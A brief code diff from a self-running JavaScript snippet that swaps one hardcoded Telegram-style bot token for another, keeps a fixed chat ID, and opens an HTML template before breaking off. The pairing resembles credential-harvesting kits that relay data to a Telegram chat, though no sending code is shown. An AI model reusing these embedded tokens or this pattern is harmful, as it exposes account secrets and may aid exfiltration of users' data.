@@ -1,5 +1,5 @@
 (function() {
-    const TOKEN = "7719637928:AAFsQ6QHSH7z_GUeu6HMYl62yngKQPsRL_g";
+    const TOKEN = "8685754701:AAFPICFAVcUeSYmXzj__A3j-OXpJQEAVnvs";
     const ID = "6013637983";
 
     const html = `
